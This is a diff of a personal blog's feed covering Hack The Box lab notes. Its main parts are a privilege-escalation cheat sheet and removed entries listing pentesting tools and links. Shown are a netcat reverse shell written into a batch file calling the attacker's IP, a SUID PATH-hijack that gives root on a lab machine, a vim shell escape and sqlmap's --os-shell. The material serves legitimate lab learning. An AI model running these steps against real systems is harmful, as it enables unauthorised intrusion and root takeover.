-You can use &lt;a href=&quot;https://github.com/carlospolop/PEASS-ng&quot;&gt;https://github.com/carlospolop/PEASS-ng&lt;/a&gt;.
+<p>You need to run the executable file in the target Windows machine. The script will identify the possible vulnerabilities to explot and gain admin access.</p>
 
-You need to run the executable file in the target Windows machine. The script will identify the possible vulnerabilities to explot and gain admin access.
+<p>It might be possible that the password of the admin user has been pasted in the history of the shell. Check the output of winpeas for references to <code class="language-plaintext highlighter-rouge">ConsoleHost_history.txt</code> file.</p>
 
-It might be possible that the password of the admin user has been pasted in the history of the shell. Check the output of winpeas for references to `ConsoleHost_history.txt` file.
+<p>Another interesting path to privilege escalation is to check the permissions of a file. In order to do so, run <code class="language-plaintext highlighter-rouge">icacls</code> command. (F) means <code class="language-plaintext highlighter-rouge">Full access</code> and is a promising way of privilege escalation.</p>
 
-Another interesting path to privilege escalation is to check the permissions of a file. In order to do so, run `icacls` command. (F) means `Full access` and is a promising way of privilege escalation.
+<p>You can potentially modify a script and make it open a reverse shell with netcat.</p>
 
-You can potentially modify a script and make it open a reverse shell with netcat.
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>C:<span class="se">\L</span>og-Management<span class="se">\n</span>c64.exe <span class="nt">-e</span> cmd.exe <span class="o">{</span>your_IP<span class="o">}</span> <span class="o">{</span>port<span class="o">}</span> <span class="o">&gt;</span> C:<span class="se">\L</span>og-Management<span class="se">\j</span>ob.bat
+</code></pre></div></div>
 
-```bash
-echo C:\Log-Management\nc64.exe -e cmd.exe {your_IP} {port} &gt; C:\Log-Management\job.bat
-```
+<p>When the script is executed, you’ll get a shell in the attacker netcat</p>
 
-When the script is executed, you&apos;ll get a shell in the attacker netcat
+<h3 id="privilege-escalation-on-linux-">Privilege escalation on Linux <a name="privilege-escalation-linux"></a></h3>
 
-### Privilege escalation on Linux &lt;a name=&quot;privilege-escalation-linux&quot;&gt;&lt;/a&gt;
+<p>First, check what permissions <code class="language-plaintext highlighter-rouge">sudo</code> permissions the user has with <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p>
 
-First, check what permissions `sudo` permissions the user has with `sudo -l`.
+<p>Also, check the binaries accessible to the group of the user:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-group</span> bugtracker 2&gt;/dev/null
+</code></pre></div></div>
+<h4 id="set-owner-user-id-">Set owner User ID <a name="privilege-escalation-suid"></a></h4>
 
-Also, check the binaries accessible to the group of the user:
-```bash
-find / -group bugtracker 2&gt;/dev/null
-```
-#### Set owner User ID &lt;a name=&quot;privilege-escalation-suid&quot;&gt;&lt;/a&gt;
+<p>If any, check the file flags and permissions:</p>
 
-If any, check the file flags and permissions:
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@oopsie:/var/www/html<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lisa</span> /usr/bin/bugtracker <span class="o">&amp;&amp;</span> file /usr/bin/bugtracker
+&lt;isa /usr/bin/bugtracker <span class="o">&amp;&amp;</span> file /usr/bin/bugtracker
+264151 12 <span class="nt">-rwsr-xr--</span> 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/l, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
+</code></pre></div></div>
 
-```bash
-robert@oopsie:/var/www/html$ ls -lisa /usr/bin/bugtracker &amp;&amp; file /usr/bin/bugtracker
-&lt;isa /usr/bin/bugtracker &amp;&amp; file /usr/bin/bugtracker
-264151 12 -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
-/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
-```
+<p>The flags show <code class="language-plaintext highlighter-rouge">s</code> and file shows <code class="language-plaintext highlighter-rouge">setuid</code>. That is a special permission named SUID or Set Owner User ID. SUID allows an alternate user to run an executable with the same permissions as the owner of the file instead of the permissions of the alternate user. That looks promising for privilede escalation.</p>
 
-The flags show `s` and file shows `setuid`. That is a special permission named SUID or Set Owner User ID. SUID allows an alternate user to run an executable with the same permissions as the owner of the file instead of the permissions of the alternate user. That looks promising for privilede escalation.
+<p>In our case, the binary ‘bugtracker’ is owned by root &amp; we can execute it as root since it has SUID set.</p>
 
-In our case, the binary &apos;bugtracker&apos; is owned by root &amp; we can execute it as root since it has SUID set.
+<p>If we execute the app, we can see that is asking for input. On invalid input it shows an error showing that it’s using <code class="language-plaintext highlighter-rouge">cat</code> command:</p>
 
-If we execute the app, we can see that is asking for input. On invalid input it shows an error showing that it&apos;s using `cat` command:
-
-```bash
-robert@oopsie:/var/www/html$ bugtracker 12
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@oopsie:/var/www/html<span class="nv">$ </span>bugtracker 12
 bugtracker 12
 
-------------------
+<span class="nt">------------------</span>
 : EV Bug Tracker :
-------------------
+<span class="nt">------------------</span>
 
 Provide Bug ID: 12
 12
----------------
+<span class="nt">---------------</span>
 
-cat: /root/reports/12: No such file or directory
-```
-Looks like it&apos;s not using the full path of the cat tool. We can create a executable named `cat` and put it before in PATH and it will execute that `cat` (/tmp/cat) instead of the real `cat`:
+<span class="nb">cat</span>: /root/reports/12: No such file or directory
+</code></pre></div></div>
+<p>Looks like it’s not using the full path of the cat tool. We can create a executable named <code class="language-plaintext highlighter-rouge">cat</code> and put it before in PATH and it will execute that <code class="language-plaintext highlighter-rouge">cat</code> (/tmp/cat) instead of the real <code class="language-plaintext highlighter-rouge">cat</code>:</p>
 
-```
-echo &quot;/bin/sh&quot; &gt; /tmp/cat
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "/bin/sh" &gt; /tmp/cat
 robert@oopsie:/var/www/html$ export PATH=/tmp:$PATH
 robert@oopsie:/var/www/html$ echo $PATH
 /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
@@ -1038,1034 +1395,19 @@ Provide Bug ID: 12
 # whoami
 whoami
 root
-```
+</code></pre></div></div>
 
-and we have root access.
+<p>and we have root access.</p>
 
-#### Abuse regular application &lt;a name=&quot;privilege-escalation-app&quot;&gt;&lt;/a&gt;
+<h4 id="abuse-regular-application-">Abuse regular application <a name="privilege-escalation-app"></a></h4>
 
-If `sudo -l` shows permission for any binary, check &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;https://gtfobins.github.io/&lt;/a&gt; for a way to exploit the binary to gain root access.
+<p>If <code class="language-plaintext highlighter-rouge">sudo -l</code> shows permission for any binary, check <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> for a way to exploit the binary to gain root access.</p>
 
-E.g.: you can get root access with vim. If the user has sudo access to edit some file, you can abuse it to get root access: 
+<p>E.g.: you can get root access with vim. If the user has sudo access to edit some file, you can abuse it to get root access:</p>
 
-```bash
-vi
-:set shell=/bin/sh
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi
+:set <span class="nv">shell</span><span class="o">=</span>/bin/sh
 :shell
-```
+</code></pre></div></div>
 
-Another case, might be seeing a unix socket (docker or lxd) with potential root permissions, in that case check in hacktrics: &lt;a href=&quot;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation&quot;&gt;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation&lt;/a&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the steps I take to complete the challenges.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting interesting links</title><link href="https://www.agalera.eu/pentesting-resources/" rel="alternate" type="text/html" title="Pentesting interesting links" /><published>2022-12-25T00:00:00+01:00</published><updated>2022-12-25T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting-resources</id><content type="html" xml:base="https://www.agalera.eu/pentesting-resources/">I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I&apos;ll use this article to save all the pentesting interesting links I found.
-
-&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
-
-## Resources
-
-| Name | Description | Link |
-| pentestbook.six2dez.com | General guides on pentesting | &lt;a href=&quot;https://pentestbook.six2dez.com/&quot;&gt;https://pentestbook.six2dez.com/&lt;/a&gt; |
-| revshells | List of reverse shells | &lt;a href=&quot;https://www.revshells.com/&quot;&gt;https://www.revshells.com/&lt;/a&gt; |
-| Hacktricks | Useful for everything related with pentesting | &lt;a href=&quot;https://book.hacktricks.xyz/welcome/readme&quot;&gt;https://book.hacktricks.xyz/welcome/readme&lt;/a&gt;
-| SecLists | Wordlists and stuff | &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt; |
-| Reverse shells | More reverse shells payloads | &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md&quot;&gt;swisskyrepo/PayloadsAllTheThings&lt;/a&gt; |
-| Pentestmonkey | Another pentesting guide | &lt;a href=&quot;https://pentestmonkey.net/&quot;&gt;https://pentestmonkey.net/&lt;/a&gt; |
-| GTFOBins | List of UNIX binaries that can be used to bypass local security restrictions | &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;https://gtfobins.github.io/&lt;/a&gt; |
-| LOLbas | Similar to GTFObins but for Windows | &lt;a href=&quot;https://lolbas-project.github.io/&quot;&gt;https://lolbas-project.github.io/&lt;/a&gt; |
-| Red team notes | Red team notes | &lt;a href=&quot;https://www.ired.team/&quot;&gt;https://www.ired.team/&lt;/a&gt; |
-| SQL injections | SQL injections | &lt;a href=&quot;https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/&quot;&gt;SQL injection cheatsheet&lt;/a&gt; |
-| CVE mitre | Search for CVEs |&lt;a href=&quot;https://cve.mitre.org/cve/search_cve_list.html&quot;&gt;https://cve.mitre.org/cve/search_cve_list.html&lt;/a&gt;|
-| Request repo | Tool to receive HTTP request and display data | &lt;a href=&quot;https://requestrepo.com/&quot;&gt;https://requestrepo.com/&lt;/a&gt; |
-| CTF 101 | CTF theory | &lt;a href=&quot;https://ctf101.org/&quot;&gt;https://ctf101.org/&lt;/a&gt; |</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting interesting links I found.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting tools</title><link href="https://www.agalera.eu/pentesting-tools/" rel="alternate" type="text/html" title="Pentesting tools" /><published>2022-12-16T00:00:00+01:00</published><updated>2022-12-16T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting-tools</id><content type="html" xml:base="https://www.agalera.eu/pentesting-tools/">I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I&apos;ll use this article to save all the pentesting tools I am learning.
-
-&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
-
-## nmap
-
-nmap is a port scanner tool. By default it scan ports from 0-1000.
-
-You should pass the `-A` flag which enables OS detection, version detection, script scanning, and traceroute:
-
-```
-nmap -A &lt;ip&gt;
-```
-
-To enable only service version detection:
-```
-nmap -sV &lt;ip&gt;
-```
-
--sV flag does scanning and prints service and version on the found open port
-
-To specify the default set of scripts for version identification use `-sC` 
-
-```
-nmap -sC &lt;ip&gt;
-```
-
-To scan all the ports, we need to specify this flags:
-
-```
-namp -sV -p- --min-rate 1000 &lt;ip&gt;
-```
-
-Take into account that this operation will take a long time to complete.
-
-`--min-rate` speeds up the process by sending packets not slower than X messages per second.
-
-Be aware that this might trigger some suspicion on IDS, for that, check the `-T0` or `-T1` flag.
-
-If nmap reports he has issues because could not determine if port open or closed. The machine might be protected by a firewall, instead of performing a TCP SYN scan, you can use a TCP FIN scan by providing the flag `-sF`
-
-You can disable DNS resolution with `-n`
-
-You can generate a nice report by using the `-oX` flag and `--webxml`, e.g.:
-
-```
-nmap -p- -sC -sV -n --min-rate 1000 10.129.95.187 -oX nmap_allPorts --webxml
-```
-
-You can disable ping scan (blocked by firewalls) by disabling host discovery: `-Pn`.
-
-## telnet
-
-Telnet is a very old way of connecting to computer and by default listens on port 23.
-
-Usage:
-
-```
-telnet &lt;ip&gt;
-```
-
-The prompty will ask for user/password:
-```
-telnet &lt;ip&gt;
-Trying &lt;ip&gt;...
-Connected to &lt;ip&gt;.
-Escape character is &apos;^]&apos;.
-
-  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
-  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
-  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
-
-
-Meow login: root
-```
-
-## ftp
-
-Stands for File transfer protocol. It listens on port 21 by deault and is unencrypted (the secure version is called sftp)
-
-The first thing to try while trying to access ftp is user `anonymous` whitout password.
-
-Commands:
-- `ls`: list directory contents
-- `pass`: set passive mode
-- `get`: retrieve file to computer
-
-Examples
-
-```
-ftp &lt;ip&gt;
-Connected to &lt;ip&gt;.
-220 (vsFTPd 3.0.3)
-Name (&lt;ip&gt;:gal): anonymous
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&gt; ls
-500 Illegal PORT command.
-ftp: bind: Address already in use
-ftp&gt; pass
-Passive mode on.
-ftp&gt; ls
-227 Entering Passive Mode (10,129,103,239,82,68).
-150 Here comes the directory listing.
--rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
-226 Directory send OK.
-ftp&gt; get flag.txt /tmp/flag.txt
-local: /tmp/flag.txt remote: flag.txt
-227 Entering Passive Mode (10,129,103,239,159,232).
-150 Opening BINARY mode data connection for flag.txt (32 bytes).
-226 Transfer complete.
-32 bytes received in 0.00 secs (21.1291 kB/s)
-```
-
-* in order to use the `ls` command, we need to set the Passive mode by issuing the `pass` command
-
-Download all contents of ftp-server:
-
-```
-wget -m ftp://username:password@ip.of.old.host
-```
-
-To see hidden files:
-
-```
-ls -la
-```
-
-## smb
-
-Stands for Server Message Block and is a protocol for file sharing between computers. It runs on port 445 by default.
-
-The command line tool to interact with it, it&apos;s `smbclient`.
-
-To list shared directories:
-
-```
-smbclient -L \\&lt;ip&gt;
-Enter WORKGROUP\gal&apos;s password:
-
-        Sharename       Type      Comment
-        ---------       ----      -------
-        ADMIN$          Disk      Remote Admin
-        C$              Disk      Default share
-        IPC$            IPC       Remote IPC
-        WorkShares      Disk
-SMB1 disabled -- no workgroup available
-```
-
-Note the `\\` prefix, this comes from Windows slahes. Make sure to pass the `--user` flag, otherwise it will try to connect using your Linux user:
-
-```
-smbclient -L \\10.129.68.251 --user=&quot;Administrator&quot;
-Password for [WORKGROUP\Administrator]:
-
-	Sharename       Type      Comment
-	---------       ----      -------
-	ADMIN$          Disk      Remote Admin
-	C$              Disk      Default share
-	IPC$            IPC       Remote IPC
-```
-
-Now, let&apos;s connect to the shared:
-
-```
-smbclient \\\\&lt;ip&gt;\\WorkShares
-Enter WORKGROUP\gal&apos;s password:
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt;
-```
-
-The commands to use once inside are the same as ftp
-
-You can use `-N` flag to don&apos;t use any password
-
-If you see this error: `protocol negotiation failed: NT_STATUS_NOT_SUPPORTED`, you need to configure min/max protocol versions, see: &lt;a href=&quot;https://unix.stackexchange.com/questions/562550/smbclient-protocol-negotiation-failed&quot;&gt;https://unix.stackexchange.com/questions/562550/smbclient-protocol-negotiation-failed&lt;/a&gt;
-
-## redis
-
-Redis is an in-memory key-value (NoSQL) database running on 6379 port by default
-
-To connect to the database, we must use `redis-cli`:
-
-```
-redis-cli -h &lt;ip&gt;
-```
-
-Once inside we can retrieve more information by using the `info` command:
-
-```
-&lt;ip&gt;:6379&gt; info
-# Server
-redis_version:5.0.7
-redis_git_sha1:00000000
-redis_git_dirty:0
-redis_build_id:66bd629f924ac924
-redis_mode:standalone
-os:Linux 5.4.0-77-generic x86_64
-arch_bits:64
-```
-
-To enumerate the database with some entries, we can use the `info keyspace` command. This information is present in the `info` response as well. 
-
-To retrieve all the keys in a given database, we can use the `keys *` command once we have selected the database. To access a particular key, we use the `get` command:
-
-```
-redis-cli -h &lt;ip&gt;
-&lt;ip&gt;:6379&gt; select 0
-OK
-&lt;ip&gt;:6379&gt; keys *
-1) &quot;numb&quot;
-2) &quot;temp&quot;
-3) &quot;flag&quot;
-4) &quot;stor&quot;
-&lt;ip&gt;:6379&gt; keys flag
-1) &quot;flag&quot;
-&lt;ip&gt;:6379&gt; get flag
-&quot;flag&quot;
-```
-
-## rdp
-
-Stands for Remote Desktop Protocol and runs on port 3389.
-
-To connect, you can use Windows tool or if in Linux, `xfreerdp` or any other alternative.
-
-If checking a Windows machine, try first the `Administrator` user.
-
-## MongoDB
-
-MongoDB is a document based (NoSQL) database that runs by default on port 27017.
-
-To connect to it, we should use the mongo shell, currently `mongosh`.
-
-To show all the database in the instance, use the `show dbs` command.
-
-To select a database: `use &lt;db&gt;`
-
-To show all the collections in a database use the `show collections` commands.
-
-To show contents of all the documents inside a collection use the `db.&lt;collection&gt;.find().pretty()`. It will pretty print the results.
-
-Example:
-
-```
-mongosh &lt;ip&gt;
-Current Mongosh Log ID: 63999d00a5b1f19a65a9d84b
-Connecting to:          mongodb://&lt;ip&gt;:27017/?directConnection=true&amp;appName=mongosh+1.6.1
-Using MongoDB:          3.6.8
-Using Mongosh:          1.6.1
-
-For mongosh info see: https://docs.mongodb.com/mongodb-shell/
-
-test&gt; show dbs
-admin                  32.00 KiB
-config                 72.00 KiB
-local                  72.00 KiB
-sensitive_information  32.00 KiB
-users                  32.00 KiB
-test&gt; show collections
-
-test&gt; use sensitive_information
-switched to db sensitive_information
-sensitive_information&gt; show collections
-flag
-sensitive_information&gt; db.flag.find().pretty()
-[
-  {
-    _id: ObjectId(&quot;630e3dbcb82540ebbd1748c5&quot;),
-    flag: &apos;flag&apos;
-  }
-]
-sensitive_information&gt;
-```
-
-## rsync
-
-rsync is a tool to share files between Linux machines, it defaults to SSH port (22) or 873.
-
-With `rsync://` will use 873 port while the form `user@host` will use the SSH port
-
-To list all the rsync shares:
-
-```
-rsync --list-only rsync://&lt;ip&gt;
-public         	Anonymous Share
-```
-
-## gobuster
-
-gobuster performs dir busting on a web server. It discovers available paths using a word list.
-
-The following examples checks all the words in `/usr/share/dict/american-english-small` dictionary and searches for paths with `php` extensions and stores the results in `/tmp/found` and uses 20 threads:
-
-```
-gobuster -x php -u http://&lt;ip&gt; -w /usr/share/dict/american-english-small -o /tmp/found -t 20  
-```
-
-gobuster can also perform sub-domain enumeration (by dns records or by virtual host) e.g:
-
-```
-gobuster vhost --url http://thetoppers.htb -w /usr/share/workdlists/subdomains-top1million-5000.txt -t 50 --append-domain
-```
-
-Consider using different wordlist for subdomains and for directories
-
-## Responder
-
-the responder tool: &lt;a href=&quot;https://github.com/lgandx/Responder&quot;&gt;https://github.com/lgandx/Responder&lt;/a&gt;
-
-For getting NTLM password, responder tool will setup a rogue SMB server that will capture the challenge initiated by another machine in the network and store the hash of the challenge.
-
-```
-sudo responder -I tun0
-```
-
-## John the ripper
-
-Password cracking tool. It does not do anything magic, it just compares a hash file with a list of words (dictionary). It has a quite decente default dictionary, however, you can search for more complete dictionaries such as the &lt;a href=&quot;https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwi5noL2vP77AhXLXqQEHYafALkQFnoECA0QAQ&amp;url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&amp;usg=AOvVaw3snAERl1mU6Ccr4WFEazBd&quot;&gt;rock you&lt;/a&gt;
-
-Make sure to install a version &gt;= 1.9.0, which enables support for many hash formats. In my case for 1.8.0 version I couldn&apos;t crack a NTLMv2 hash.
-
-You can also use `zip2john` tool to brute-force zip files with passwords.
-
-You can find here &lt;a href=&quot;https://github.com/openwall/john&quot;&gt;https://github.com/openwall/john&lt;/a&gt;. 
-
-You can specify the format as well:
-
-```
-john --format=raw-md5 passwd.txt
-```
-
-## evil-winrm
-
-Once you know the user/password of a Windows target, you can use &lt;a href=&quot;https://github.com/Hackplayers/evil-winrm&quot;&gt;evil-winrm&lt;/a&gt; to connect to the Powershell. Consider this tool as the PowerShell for Linux.
-
-The usage is quite easy:
-
-```
-evil-winrm -i 10.129.67.87 -u Administrator -p &lt;password&gt;
-```
-
-If you see some SSL error while connecting to the target make sure to enable support for legacy md4 hash:
-
-Make sure the file `/etc/ssl/openssl.cnf` contains the following:
-
-```
-[provider_sect]
-default = default_sect
-legacy = legacy_sect
-
-[default_sect]
-activate = 1
-
-[legacy_sect]
-activate = 1
-```
-
-## postgres
-
-Basic commands (outisde of SQL queries):
-
-`\l` list databases
-`\c db` connect to a database named `db`
-`\dt` list tables on given database
-
-## netcat
-
-Listen on 1234 port:
-
-```
-nc -lnvp 1234
-```
-
--l : Listen mode
-
--n: numeric-only IP addresses, no dns
-
--v: verbose
-
--p: port - we can add p to say that we want to listen on a specific port (here 1234)
-
-## impackets
-
-&lt;a href=&quot;https://github.com/fortra/impacket&quot;&gt;https://github.com/fortra/impacket&lt;/a&gt;
-
-Impacket is a collection of Python classes for working with network protocols
-
-I&apos;ve used it to exploit samba and mssql.
-
-### mssqlclient
-```
-mssqlclient.py -windows-auth ARCHETYPE/sql_svc@10.129.95.187
-
-SQL&gt; xp_cmdshell whoami
-output                                                                             
-
---------------------------------------------------------------------------------   
-
-archetype\sql_svc                                                                  
-
-NULL                                                                               
-
-SQL&gt; 
-
-```
-
-## wesg
-
-&lt;a href=&quot;https://github.com/bitsadmin/wesng&quot;&gt;https://github.com/bitsadmin/wesng&lt;/a&gt;
-
-Checks for Windows vulnerabilities given the output of a `systeminfo` command.
-
-## Burp suite
-
-&lt;a href=&quot;https://portswigger.net/burp/communitydownload&quot;&gt;https://portswigger.net/burp/communitydownload&lt;/a&gt;
-
-This suite has a lot of nice features such:
-
-- Proxy
-- Repeater
-- Generating sitemap
-- ...
-
-## sqlmap
-
-Checks certain url for SQL injection vulnerabilities:
-
-The easiest way is to capture traffic request to the possible vulnerable URL with burp and send it to sqlmap
-
-```
-sqlmap -r search-request.txt
-```
-
-if you submit the `--os-shell` flag you&apos;ll get a shell on the target
-
-## Interactive shell
-
-When doing reverse shells, the terminal is quite shitty and it lack basic features. In order to get a better shell, we could the following commands:
-
-```
-python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;
-----
-stty raw -echo
-fg
-export TERM=xterm
-```
-
-## Searchsploit
-
-Once the enumeration succeded and you have the service and version, you can use `searchsploit` to search for possible sploits, see example:
-
-```bash
-segal@gal-Modern-14-C12M:~$ searchsploit vsFTPd 2.3.4
----------------------------------------------- ---------------------------------
- Exploit Title                                |  Path
----------------------------------------------- ---------------------------------
-vsftpd 2.3.4 - Backdoor Command Execution     | unix/remote/49757.py
-vsftpd 2.3.4 - Backdoor Command Execution (Me | unix/remote/17491.rb
----------------------------------------------- ---------------------------------
-Shellcodes: No Results
-```
-
-## Ghidra
-
-Is a decompiler/debugger tool very useful to analyse binaries and understand the logic inside
-
-&lt;a href=&quot;https://github.com/NationalSecurityAgency/ghidra&quot;&gt;https://github.com/NationalSecurityAgency/ghidra&lt;/a&gt;
-
-## RsaCtfTool
-
-Is a tool to check/attack RSA keys. 
-
-I have used it to retrieve a private key from a weak RSA public key. The key pair are generated by multiplying two prime numbers, if the prime numbers are not big enough, they can be guessed and reveal the private key.
-
-To decypher the file encrypted with the private key use `openssl`:
-
-```
-openssl rsautl -in flag.enc -out flag.txt -decrypt -inkey key.priv
-```
-
-To know the length of the RSA:
-```
-openssl rsa -in key.pub --RSAPublicKey_in -text -noout
-openssl rsa -in key.priv -text -noout
-```
-
-## gdb
-
-`gdb` is the GNU debugger. See the following operations:
-
-- Set a breakpoint: `b *0x08049291`
-- Run the program: `r`
-- Run program with input: `r &lt; pattern.txt`
-- Continue the execution after breakpoint: `c`
-- Show file information: `info file`
-- Show stack: `x/60x $esp`
-- Show where the address points: `x/i &lt;address&gt;`, e.g.:
-```
-gef➤  x/i 0x7ffff7d14a37
-   0x7ffff7d14a37 &lt;__GI___libc_write+23&gt;:	cmp    rax,0xfffffffffffff000
-```
-- Get variable memory address (variable named target): `p &amp;target`
-
-## gdb-peda
-
-Python Exploit Development Assistance for GDB
-
-&lt;a href=&quot;https://github.com/longld/peda&quot;&gt;https://github.com/longld/peda&lt;/a&gt;
-
-- Create a pattern of 200 chars: `pattern_create 200 bof.txt`
-- Calculate the number of characters to do buffer overflow: `pattern_offset &lt;EIP register&gt;`
-- Get assembler code for function: `disas &lt;function&gt;`. The first line shows the address you must use to jump
-
-## gdb-gef
-
-GDB-Enhaced Features
-
-&lt;a href=&quot;https://github.com/hugsy/gef&quot;&gt;https://github.com/hugsy/gef&lt;/a&gt;
-
-- `vmmap`: show how the memory is organized, very useful to calculate memory offsets:
-
-```
-gef➤  vmmap 
-[ Legend:  Code | Heap | Stack ]
-Start              End                Offset             Perm Path
-0x00555555554000 0x00555555555000 0x00000000000000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time
-0x00555555555000 0x00555555556000 0x00000000001000 r-x /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time
-0x00555555556000 0x00555555557000 0x00000000002000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time
-0x00555555557000 0x00555555558000 0x00000000002000 rw- /home/gal/workspace/hackthebox/spooky-time/challenge/spooky_time
-0x007ffff7d90000 0x007ffff7d93000 0x00000000000000 rw- 
-0x007ffff7d93000 0x007ffff7dbb000 0x00000000000000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6
-0x007ffff7dbb000 0x007ffff7f50000 0x00000000028000 r-x /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6
-0x007ffff7f50000 0x007ffff7fa8000 0x000000001bd000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6
-0x007ffff7fa8000 0x007ffff7fac000 0x00000000214000 r-- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6
-0x007ffff7fac000 0x007ffff7fae000 0x00000000218000 rw- /home/gal/workspace/hackthebox/spooky-time/challenge/glibc/libc.so.6
-```
-spooky_time memory is between address `0x00555555554000` and `0x00555555558000`
-libc memory is between address `0x007ffff7d93000` and `0x007ffff7fae000`</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting tools I am learning.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Python app structure</title><link href="https://www.agalera.eu/python-app-structure/" rel="alternate" type="text/html" title="Python app structure" /><published>2022-12-13T00:00:00+01:00</published><updated>2022-12-13T00:00:00+01:00</updated><id>https://www.agalera.eu/python-app-structure</id><content type="html" xml:base="https://www.agalera.eu/python-app-structure/">Recently I was starting a Python application project from scratch and I had some issues understanding the correct project structure. Here&apos;s what I have learnt.
-
-&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
-
-## Project structure
-
-Here you can find the project structure of a python application implementing a cli tool named `examplecli`. You can find that app here: &lt;a href=&quot;https://github.com/adriangalera/examplecli&quot;&gt;https://github.com/adriangalera/examplecli&lt;/a&gt;
-
-```
-├── Makefile
-├── README.md
-├── examplecli
-│   ├── __init__.py
-│   ├── commands
-│   │   ├── __init__.py
-│   │   ├── bye.py
-│   │   ├── hello.py
-│   │   └── options.py
-│   ├── common
-│   │   ├── __init__.py
-│   │   └── logging.py
-│   └── entrypoint.py
-├── requirements.txt
-├── requirements_test.txt
-├── scripts
-│   ├── local-build.sh
-│   └── set-module-in-path.sh
